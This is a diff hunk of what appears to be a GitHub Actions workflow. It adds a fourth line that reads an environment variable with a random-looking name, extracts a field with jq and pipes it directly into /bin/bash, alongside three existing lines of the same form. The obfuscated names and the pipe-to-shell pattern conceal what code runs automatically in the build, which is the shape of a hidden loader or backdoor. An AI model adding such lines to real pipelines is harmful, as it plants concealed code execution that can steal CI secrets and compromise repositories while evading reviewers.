@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$abtwd982" | jq -r .iamuw571 | /bin/bash
           echo $ddtyg41920 | jq -r .xxvu68 | /bin/bash
           echo $e47753 | jq -r .i09 | /bin/bash
+          echo $li7 | jq -r .bt19 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
